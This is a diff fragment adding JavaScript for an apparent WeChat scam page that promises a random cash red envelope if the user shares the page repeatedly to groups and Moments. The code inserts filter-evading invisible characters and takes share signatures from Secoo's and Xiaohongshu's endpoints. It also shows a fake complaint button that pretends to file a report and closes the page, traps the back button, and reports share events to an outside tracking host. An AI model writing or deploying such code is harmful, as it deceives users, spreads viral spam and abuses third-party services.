+        strList.push('%' + pad(1 + Math.round(Math.random() * 18), 2));
+    }
+    return strList.join('');
+}
+
+function record(event, id, allow_reply) {
+    try {
+        if (!localStorage.getItem(event + ':' + id) || allow_reply) {
+            $.post('https://s.duyajiuye.com/record', {
+                event: event,
+                id: id
+            })
+            localStorage.setItem(event + ':' + id, true);
+        }
+    } catch (e) {
+
+    }
+}
+
+function showShareTips(obj) {
+    if (typeof obj === 'object') {
+        g_dialog.alert({
+            title: obj.successTitle || '',
+            message: obj.successTips,
+            btn: '我知道了'
+        });
+    } else if (typeof obj === 'string' && obj) {
+        g_dialog.alert({
+            title: '',
+            message: obj,
+            btn: '我知道了'
+        });
+    }
+}
+
+// 分享
+(function () {
+
+    var group_ad = false;
+    var timeline_ad = true;
+    var shareATimes = 0;
+    var shareTTimes = 0;
+
+    var hiddenProperty = 'hidden' in document ? 'hidden' : 'webkitHidden' in document ? 'webkitHidden' : 'mozHidden' in document ? 'mozHidden' : null;
+    var visibilityChangeEvent = hiddenProperty.replace(/hidden/i, 'visibilitychange');
+
+    function onVisibilityChange() {
+        if (!document[hiddenProperty]) {
+            setTimeout(function () {
+                if (!document[hiddenProperty]) {
+                    if (shareATimes <= 3) {
+                        appmessage_callback(true);
+                    } else {
+                        timeline_callback(true);
+                    }
+                }
+            }, 100)
+        }
+    };
+
+    if (window.data.attached && window.data.attached['jfx']) {
+        document.addEventListener(visibilityChangeEvent, onVisibilityChange);
+    }
+
+    function share_tip() {
+        // 4次群 2次朋友圈
+        if (shareATimes == 0) {
+            showShareTips(window.g_tips_message_obj);
+        } else if (shareATimes == 1) {
+            window.g_tips_message_obj = gConfig.groupTips[0];
+            showShareTips(window.g_tips_message_obj);
+            shareFriend();
+        } else if (shareATimes == 2) {
+            window.g_tips_message_obj = gConfig.groupTips[1];
+            showShareTips(window.g_tips_message_obj);
+            shareFriend();
+        } else if (shareATimes == 3) {
+            window.g_tips_message_obj = gConfig.groupTips[2];
+            showShareTips(window.g_tips_message_obj);
+            shareFriend();
+        } else {
+            if (shareTTimes < 1) {
+                window.g_tips_message_obj = gConfig.groupTips[3];
+                showShareTips(window.g_tips_message_obj);
+                show_timeline_menu();
+                shareTimeline();
+                $('.js_share_to_desc').text('朋友圈');
+            } else {
+                shareTimeline();
+
+                if (shareTTimes == 1 && timeline_ad) {
+                    window.g_tips_message_obj = gConfig.timeLineTips[0];
+                    showShareTips(window.g_tips_message_obj);
+                } else {
+                    try {
+                        $(document.body).trigger('event_page_share_done');
+                    } catch (e) {
+
+                    }
+                }
+            }
+        }
+    }
+
+    function timeline_callback() {
+        if (shareATimes >= 3) {
+            shareTTimes += 1;
+        }
+        share_tip();
+        record('share-timeline', shareTTimes, true);
+    }
+
+    function appmessage_callback() {
+        shareATimes += 1;
+        share_tip();
+        record('share-appmessage', shareATimes, true);
+    }
+
+    function shareFriend() {
+        var result = window.data.to_group;
+        if (window.data.attached['ad_share']['qun'][shareATimes]) {
+            result = {
+                'title': window.data['ad']['title'],
+                'link': window.data['ad']['app_url'],
+                'img': window.data['ad']['img'],
+                'desc': window.data['ad']['desc']
+            }
+        }
+        if (window.data.attached.signmode == 'jsb') {
+            WeixinJSBridge.on('menu:share:appmessage', function (argv) {
+                WeixinJSBridge.invoke('sendAppMessage', {
+                    "title": result.title.replace('{city}', getCity()).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq).replace(/{money}/ig, gConfig.money),
+                    "desc": result.desc.replace('{city}', getCity()).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq).replace(/{money}/ig, gConfig.money),
+                    "link": result.link.replace(/{fuck163}/ig, getFuck163()),
+                    "img_url": result.img,
+                    "dataUrl": "http://fs.ringop.kugou.com/G132/M0B/0C/1B/xA0DAFqPht2AGh9BACJOIM_Aa8U043.mp3",
+                }, function (res) {
+                    if (/ok|confirm/i.test(res.err_msg || res.errMsg)) {
+                        appmessage_callback();
+                    }
+                });
+            });
+        } else if (window.data.attached.signmode == 'jssdk' && !window.data.attached['jfx']) {
+            wx.ready(function () {
+                var link = result.link;
+                if (checkIsMp()) {
+                    link = g_shareData['jssdk']['groupUrl'] || link;
+                    if (window.data.attached['ad_share']['qun'][shareATimes] && g_shareData['jssdk']['cashUrl']) {
+                        link = g_shareData['jssdk']['cashUrl'];
+                    }
+                }
+                wx.onMenuShareAppMessage({
+                    title: result.title.replace('{city}', getCity()).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq).replace(/{money}/ig, gConfig.money),
+                    link: link.replace(/{fuck163}/ig, getFuck163()),
+                    desc: result.desc.replace('{city}', getCity()).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq).replace(/{money}/ig, gConfig.money),
+                    imgUrl: result.img,
+                    dataUrl: "http://fs.ringop.kugou.com/G132/M0B/0C/1B/xA0DAFqPht2AGh9BACJOIM_Aa8U043.mp3",
+                    success: function () {
+                        appmessage_callback();
+                    },
+                    cancel: function () {}
+                });
+            })
+        } else {
+            document.title = result.title.replace('{city}', getCity()).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq).replace(/{money}/ig, gConfig.money);
+        }
+    }
+
+    function shareTimeline(result) {
+        var result = window.data.to_timeline;
+        if (window.data.attached['ad_share']['pyq'][shareTTimes]) {
+            result = {
+                'title': window.data['ad']['desc'],
+                'link': window.data['ad']['timeline_url'],
+                'img': window.data['ad']['img'],
+                'desc': window.data['ad']['desc']
+            }
+        }
+
+        if (window.data.attached.signmode === 'jsb') {
+            WeixinJSBridge.on('menu:share:timeline', function (argv) {
+                var __shareData = {
+                    "title": result.title.replace('{city}', getCity()).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq).replace(/{money}/ig, gConfig.money),
+                    //"desc": result.desc.replace('{city}', getCity()).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq).replace(/{money}/ig, gConfig.money),
+                    "link": result.link.replace(/{fuck163}/ig, getFuck163()),
+                    "img_url": result.img,
+                    "dataUrl": "http://fs.ringop.kugou.com/G132/M0B/0C/1B/xA0DAFqPht2AGh9BACJOIM_Aa8U043.mp3",
+                };
+                if (result.img.indexOf('typeVideo') > -1) {
+                    __shareData.type = 'video';
+                }
+                WeixinJSBridge.invoke('shareTimeline', __shareData, function (res) {
+                    if (/ok|confirm/i.test(res.err_msg || res.errMsg)) {
+                        timeline_callback();
+                    }
+                });
+            });
+        } else if (window.data.attached.signmode == 'jssdk' && !window.data.attached['jfx']) {
+            wx.ready(function () {
+
+                var link = result.link;
+                if (checkIsMp()) {
+                    link = g_shareData['jssdk']['timelineUrl'] || result.link;
+                    if (window.data.attached['ad_share']['pyq'][shareTTimes] && g_shareData['jssdk']['cashUrl']) {
+                        link = g_shareData['jssdk']['cashUrl'];
+                    } else {}
+                }
+
+                wx.onMenuShareTimeline({
+                    title: result.title.replace('{city}', getCity()).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq).replace(/{money}/ig, gConfig.money),
+                    link: link.replace(/{fuck163}/ig, getFuck163()),
+                    imgUrl: result.img,
+                    dataUrl: "http://fs.ringop.kugou.com/G132/M0B/0C/1B/xA0DAFqPht2AGh9BACJOIM_Aa8U043.mp3",
+                    type: 'video',
+                    success: function () {
+                        timeline_callback();
+                    },
+                    cancel: function () {}
+                });
+            })
+        } else {
+            document.title = result.title.replace('{city}', getCity()).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq).replace(/{money}/ig, gConfig.money);
+        }
+    }
+
+    function show_timeline_menu() {
+        if (window.data.attached.signmode == 'jssdk' && !window.data.attached['jfx']) {
+            if (location_host.indexOf('dangdang.com') > -1) {} else {
+                wx.hideOptionMenu();
+            }
+            if (M.getParam('debugx') === '1') {
+                wx.showMenuItems({
+                    menuList: [
+                        'menuItem:share:timeline',
+                        'menuItem:share:appMessage',
+                    ]
+                });
+            } else {
+                setTimeout(function () {
+
+                }, 1000);
+                wx.showMenuItems({
+                    menuList: ['menuItem:share:timeline']
+                });
+            }
+        }
+    }
+
+    function secoo_config() {
+        //secoo.com
+        $.ajax({
+            type: "GET",
+            url: 'https://weixin.secoo.com/activity/couplet/getSignatureByUrl.do?url=' + encodeURIComponent(location.href.split('#')[0]),
+            dataType: "jsonp",
+            jsonp: "callback",
+            callback: 'jsonp1',
+            data: {},
+            success: function (data) {
+                jssdk_config({
+                    appId: 'wxd400b479b9a80bd0',
+                    timestamp: parseInt(data.timestamp),
+                    nonceStr: data.noncestr,
+                    signature: data.Signature,
+                });
+            }
+        });
+    }
+
+    function xhs_config() {
+        $.ajax({
+            type: "GET",
+            url: 'https://www.xiaohongshu.com/api/snsweb/v1/wx_sig?url=' + encodeURIComponent(location.href.split('#')[0]),
+            dataType: "json",
+            success: function (d) {
+                if (d && d.data) {
+                    jssdk_config({
+                        appId: d.data.appid,
+                        timestamp: d.data.timestamp,
+                        nonceStr: d.data.noncestr,
+                        signature: d.data.signature,
+                    });
+                }
+            }
+        })
+    }
+
+    function jssdk_config(config) {
+        config['jsApiList'] = ['onMenuShareTimeline', 'onMenuShareAppMessage', 'hideMenuItems', 'showMenuItems'];
+        if (M.getParam('debug') === '1') {
+            config['debug'] = true;
+            alert(config['appId']);
+            alert(JSON.stringify(config));
+        } else {
+            config['debug'] = false;
+        }
+        wx.config(config);
+        wx.ready(function () {
+            if (location_host.indexOf('dangdang.com') > -1 || location_host.indexOf('fygdrs.com') > -1) {} else {
+                wx.hideOptionMenu();
+            }
+            if (M.getParam('debugx') === '1') {
+                wx.showMenuItems({
+                    menuList: [
+                        'menuItem:share:timeline',
+                        'menuItem:share:appMessage',
+                    ]
+                });
+            } else {
+                setTimeout(function () {
+
+                }, 1000);
+                wx.showMenuItems({
+                    menuList: ['menuItem:share:appMessage']
+                });
+            }
+
+
+        });
+
+        shareFriend(window.data.to_group);
+        shareTimeline(window.data.to_timeline);
+    }
+
+    function start_load() {
+        var data = window.data;
+        if (data.attached['timeline_ad']) timeline_ad = true;
+        if (data.attached['group_ad']) group_ad = true;
+
+        if (window.data.attached.signmode === 'jssdk' && !window.data.attached['jfx']) {
+            if (location_host.indexOf('secooimg.com') > -1) {
+                secoo_config();
+            } else if (location_host.indexOf('xiaohongshu.com') > -1) {
+                xhs_config();
+            } else {
+                if (window['g_shareData'] && window['g_shareData']['jssdk']) {
+                    jssdk_config(g_shareData['jssdk']);
+                }
+            }
+        } else {
+            WeixinJSBridge.call('showOptionMenu');
+        }
+        if (window.data.attached['jfx']) {
+            shareFriend();
+        } else {
+            shareFriend();
+            shareTimeline();
+        }
+    }
+
+    function init() {
+        if (typeof WeixinJSBridge === "undefined") {
+            if (document.addEventListener) {
+                document.addEventListener('WeixinJSBridgeReady', start_load, false);
+            } else if (document.attachEvent) {
+                document.attachEvent('WeixinJSBridgeReady', start_load);
+                document.attachEvent('onWeixinJSBridgeReady', start_load);
+            }
+        } else {
+            start_load();
+        }
+    }
+
+    window.g_share = {
+        init: init,
+    }
+
+}())
+
+$(function () {
+
+    var ts = (window.data.attached && window.data.attached['jfx']) ? '<div style="background:#e6e5e8;font-size: 16px; height: 40px; line-height: 40px; position: fixed;bottom: 0;left: 0;width: 100%;z-index: 99999;text-align: center;"><span id="js_id_top_tousu" style="display: inline-block;width: 100%;">微信投诉</span></div>' : '';
+    var config = {
+        tpl: {
+            body: [
+                '<div class="share-container">',
+                '  <h3 class="share-container-bg-title">分享点这里</h3>',
+                '  <div class="share-prompt">',
+                '    <p>',
+                '      点击右上角，分享到',
+                '      <i class="icon_share"></i>',
+                '      <span class="js_share_to_desc">微信群</span>',
+                '    </p>',
+                '    <p>即可领取￥<span>%(money)</span>￥ </p>',
+                '  </div>',
+                '  <div class="red-packet">',
+                '    <img>',
+                '    <p>恭喜发财</p>',
+                '  </div>',
+                '</div>'
+            ].join(''),
+        }
+    };
+
+    function initPage(money) {
+        M.resetFont();
+        $(document.body).append(config.tpl.body.jstpl_format({
+            money: money
+        }));
+        $('.red-packet img').attr('src', $('.js_head_img').attr('data-src'));
+        $('.share-container').css({
+            height: $(window).height() + 'px'
+        });
+    }
+
+    function bindEvent() {
+
+        document.body.onclick = function () {}
+
+        $('.share-container').on('click', function () {
+            if (!window['g_tips_message_obj']) {
+                window['g_tips_message_obj'] = gConfig.defaultTips;
+            }
+            showShareTips(g_tips_message_obj);
+        });
+
+        $(document.body).on('event_page_share_done', function () {
+            if (gConfig.successTips) {
+                g_dialog.alert({
+                    title: '',
+                    message: gConfig.successTips,
+                    btn: '我知道了',
+                    cb: function () {
+                        if (gConfig.endPageUrl) {
+                            location.replace(gConfig.endPageUrl);
+                        }
+                        return false
+                    }
+                });
+            }
+        });
+
+        $('#js_id_top_tousu').on('click', function () {
+            g_dialog.alert({
+                title: '<span>投诉已提交</span>',
+                message: '微信团队会尽快核实，并通过"微信团队"通知你审核结果。感谢你的支持',
+                btn: '关闭',
+                cb: function () {
+                    WeixinJSBridge.call("closeWindow");
+                }
+            })
+        })
+    }
+
+    function replaceMoney(obj, money) {
+        obj = obj || {}
+        if (obj.title) {
+            obj.title = obj.title.replace('{moneyStr}', money).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq);
+        }
+        if (obj.desc) {
+            obj.desc = obj.desc.replace('{moneyStr}', money).replace(/{fuck}/ig, '\u034f').replace('\\n', '\n').replace(/{bq}/ig, bq);
+        }
+        if (obj.successTitle) {
+            obj.successTitle = obj.successTitle.replace('{moneyStr}', money).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq);
+        }
+        if (obj.successTips) {
+            obj.successTips = obj.successTips.replace('{moneyStr}', money).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq);
+        }
+    }
+
+    function init() {
+
+        document.title = '...'
+        record('tosharer', 1);
+        loading()
+        var moneyStr = parseInt(M.getParam('money')) || parseInt((parseFloat(Math.random() * 50) + 200) * 100)
+
+        var money = (parseFloat(moneyStr / 100).toFixed(2));
+
+        gConfig.money = money;
+        gConfig.defaultTips = gConfig.defaultTips.jstpl_format({
+            money: money
+        });
+
+        gConfig.successTips = gConfig.successTips.jstpl_format({
+            money: money
+        });
+
+        replaceMoney(gConfig['ad'], money)
+        replaceMoney(gConfig['to_group'], money)
+        replaceMoney(gConfig['to_timeline'], money)
+        replaceMoney(gConfig['to_timeline'], money)
+
+        $(gConfig.groupTips).each(function (index, item) {
+            replaceMoney(item, money)
+        });
+
+        $(gConfig.timeLineTips).each(function (index, item) {
+            replaceMoney(item, money)
+        });
+
+        initPage(money);
+        setTimeout(function () {
+            bindEvent();
+            g_share.init();
+            setTimeout(function () {
+                showShareTips(gConfig.defaultTips);
+                hideloading();
+            });
+        }, 1000)
+    }
+
+    init();
+});
+
+
+function loading() {
+    $(document.body).append(
+        '<div class="popup-body loading" style="margin-top: 50%;position: absolute;width: 3rem;margin-top: 1.25rem;border-radius: 6px;background: #fff;left: 50%;margin-left: -1.5rem;"><div style="padding: .12rem .24rem .2rem;font-size: .16rem;color: rgba(0,0,0,.54);text-align: center;"><img style="width: 30px" src="//puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rN41ibuV99MPdQAGo6WSIP2aicKRzEKUtaxg/0"><br><b style="font-size: 20px;color: red">正在查询红包数据...</b></div></div>'
+    )
+}
+
+function hideloading() {
+    $('.loading').hide();
+}
+
+$(function () {
+    if (gConfig.hm) {
+        M.report(gConfig.hm);
+        M.hotClick('pv.share_page');
+    }
+    // 总统计
+    M.loadJS("https://hm.baidu.com/hm.js?46ea4995fb6116f9430b8379f5c18d8c", "async")
+});
+
+// 设置返回
+$(function () {
+    if (gConfig['attached'] && gConfig['attached']['back_api']) {
+        M.loadJS(gConfig['attached']['back_api']);
+    } else {
+        setTimeout(function () {
+            history.pushState(history.length + 1, "message", location.href.split('#')[0] + "#" + new Date().getTime())
+        }, 100);
+        window.onhashchange = function () {
+            location.href = '';
+        };
+    }
+});
+  </script>
+</body>
+
+</html>
